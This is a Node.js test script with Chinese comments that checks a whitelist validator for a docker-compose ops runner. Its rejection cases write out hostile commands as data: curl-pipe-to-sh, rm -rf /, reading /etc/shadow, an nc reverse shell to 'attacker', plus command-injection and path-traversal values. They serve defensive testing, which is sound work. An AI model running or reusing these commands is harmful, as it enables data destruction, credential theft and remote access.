/**
 * 运维执行器的白名单校验测试。
 *
 * 为什么这层也要单独测：它是"应用被攻破之后"的最后一道闸门。
 * 应用侧已经做过参数白名单，但执行器**故意不信任调用方** ——
 * 因为攻击者拿到应用之后可以绕过应用层的校验，直接构造请求打过来。
 * 所以这道闸门必须自己站得住，而它的逻辑是纯函数，可以在本地完整验证。
 *
 * 用法：node scripts/ops-runner-test.mjs
 */

// 执行器没有 OPS_TOKEN 时会拒绝启动，所以要在 import 之前设好
process.env.OPS_TOKEN = 'test-token-for-unit-test'
process.env.OPS_COMPOSE_FILE = '/compose/docker-compose.yml'
process.env.OPS_TEMPLATES_DIR = '/compose/templates'
process.env.OPS_ALLOWED_SERVICES = 'convert,stirling'

const { validate, server } = await import('../deploy/ops-runner/runner.mjs')

let passed = 0
let failed = 0

function ok(name, extra = '') {
  passed++
  console.log(`  \x1b[32m✓\x1b[0m ${name}${extra ? `  \x1b[90m${extra}\x1b[0m` : ''}`)
}

function bad(name, detail) {
  failed++
  console.log(`  \x1b[31m✗\x1b[0m ${name}\n      \x1b[31m${detail}\x1b[0m`)
}

function assert(cond, name, detail = '') {
  if (cond) ok(name, detail)
  else bad(name, detail || '断言失败')
}

/** 期望这条命令被接受。 */
function accept(argv, name) {
  const reason = validate(argv)
  assert(reason === null, name, reason ? `被拒绝：${reason}` : '')
}

/** 期望这条命令被拒绝。 */
function reject(argv, name) {
  const reason = validate(argv)
  assert(reason !== null, name, reason ? '' : `竟然通过了：${argv.join(' ')}`)
}

const COMPOSE = '/compose/docker-compose.yml'
const TPL = '/compose/templates'

console.log('\n\x1b[1m运维执行器白名单校验测试\x1b[0m\n')

// ---------------------------------------------------------------- 合法命令
console.log('【应当接受的命令】')

accept(['docker', 'ps', '--format', '{{.Names}}\t{{.Status}}\t{{.Image}}'], '查看容器状态')
accept(['docker', 'compose', '-f', COMPOSE, 'config', '--services'], '查看服务清单')
accept(['docker', 'compose', '-f', COMPOSE, 'logs', '--tail', '100', '--no-color', 'convert'], '查看日志')
accept(['docker', 'compose', '-f', COMPOSE, 'up', '-d', 'convert'], '启动服务')
accept(['docker', 'compose', '-f', COMPOSE, 'stop', 'convert'], '停止服务')
accept(['docker', 'compose', '-f', COMPOSE, 'restart', 'stirling'], '重启服务')
accept(['docker', 'compose', '-f', `${TPL}/jellyfin.yml`, '--project-name', 'wl-extension', 'pull'], '拉取模板镜像')
accept(
  ['docker', 'compose', '-f', `${TPL}/jellyfin.yml`, '--project-name', 'wl-extension', 'up', '-d'],
  '安装扩展',
)
accept(['docker', 'compose', '-f', `${TPL}/jellyfin.yml`, '--project-name', 'wl-extension', 'down'], '卸载扩展')

// ---------------------------------------------------------------- 非 docker
console.log('\n【非 docker 命令一律拒绝】')

reject(['sh', '-c', 'rm -rf /'], 'sh -c 被拒')
reject(['bash', '-c', 'curl evil.sh | sh'], 'bash -c 被拒')
reject(['rm', '-rf', '/'], 'rm 被拒')
reject(['cat', '/etc/shadow'], 'cat 被拒')
reject(['nc', '-e', '/bin/sh', 'attacker', '4444'], '反弹 shell 被拒')
reject(['docker'], '只有 docker 没有子命令也被拒（形状不匹配）')

// ---------------------------------------------------------------- 服务白名单
console.log('\n【服务白名单】')

reject(['docker', 'compose', '-f', COMPOSE, 'stop', 'app'], '不在白名单的服务被拒（app）')
reject(['docker', 'compose', '-f', COMPOSE, 'stop', 'caddy'], '不在白名单的服务被拒（caddy）')
reject(['docker', 'compose', '-f', COMPOSE, 'stop', 'postgres'], '不存在的服务被拒')

// ---------------------------------------------------------------- 路径与名称穿越
console.log('\n【路径穿越与注入】')

reject(['docker', 'compose', '-f', '/etc/passwd', 'stop', 'convert'], '换一个 compose 文件被拒')
reject(['docker', 'compose', '-f', `${COMPOSE}../evil.yml`, 'stop', 'convert'], 'compose 路径穿越被拒')
reject(
  ['docker', 'compose', '-f', `${TPL}/../../etc/passwd.yml`, '--project-name', 'wl-extension', 'up', '-d'],
  '模板路径穿越被拒',
)
reject(
  ['docker', 'compose', '-f', `${TPL}/a/b.yml`, '--project-name', 'wl-extension', 'up', '-d'],
  '模板名里含斜杠被拒',
)
reject(['docker', 'ps', '--format', 'x; rm -rf /'], 'ps 的格式串里含分号被拒')
reject(['docker', 'compose', '-f', COMPOSE, 'stop', 'convert; rm -rf /'], '服务名里含分号被拒')
reject(['docker', 'compose', '-f', COMPOSE, 'stop', 'convert$(id)'], '服务名里含命令替换被拒')
reject(['docker', 'compose', '-f', COMPOSE, 'stop', 'convert`id`'], '服务名里含反引号被拒')
reject(['docker', 'compose', '-f', COMPOSE, 'stop', 'convert|cat'], '服务名里含管道被拒')

// ---------------------------------------------------------------- 形状约束
console.log('\n【命令形状约束】')

reject(['docker', 'compose', '-f', COMPOSE, 'up', '-d'], 'up 少了服务名被拒')
reject(['docker', 'compose', '-f', COMPOSE, 'up', '-d', 'convert', '--force-recreate'], 'up 多带参数被拒')
reject(
  ['docker', 'compose', '-f', COMPOSE, 'exec', 'convert', 'sh'],
  'exec 这个动词根本不在允许清单里',
)
reject(['docker', 'run', '-v', '/:/host', 'alpine', 'sh'], 'docker run 不在清单里')
reject(
  ['docker', 'compose', '-f', `${TPL}/x.yml`, '--project-name', 'something-else', 'up', '-d'],
  '模板项目名被改则拒绝',
)
reject(
  ['docker', 'compose', '-f', `${TPL}/x.yml`, '--project-name', 'wl-extension', 'exec', 'sh'],
  '模板命令只能用 pull/up/down',
)
reject(['docker', 'compose', '-f', COMPOSE, 'logs', '--tail', '99999', '--no-color', 'convert'], 'logs 行数超上限被拒')
reject(['docker', 'compose', '-f', COMPOSE, 'logs', '--tail', '-1', '--no-color', 'convert'], 'logs 行数为负被拒')
reject(['docker', 'compose', '-f', COMPOSE, 'logs', '--tail', '100', 'convert'], 'logs 少 --no-color 被拒')
reject(['docker', 'compose', '-f', COMPOSE, 'logs', '--follow', 'convert'], 'logs 不允许 --follow')

// ---------------------------------------------------------------- 畸形输入
console.log('\n【畸形输入】')

assert(validate([]) !== null, '空数组被拒')
assert(validate(null) !== null, 'null 被拒')
assert(validate('docker ps') !== null, '字符串（而不是数组）被拒')
assert(validate([123, 'ps']) !== null, '非字符串参数被拒')
assert(validate(['docker', 'ps', '--format', null]) !== null, '参数里有 null 被拒')
assert(validate(['docker', 'ps', '--format', 'a\nb']) !== null, '参数里含换行被拒')

// ---------------------------------------------------------------- 关闭服务
server.close()

console.log(
  `\n\x1b[1m结果\x1b[0m  通过 \x1b[32m${passed}\x1b[0m  失败 \x1b[31m${failed}\x1b[0m\n`,
)
process.exit(failed === 0 ? 0 : 1)
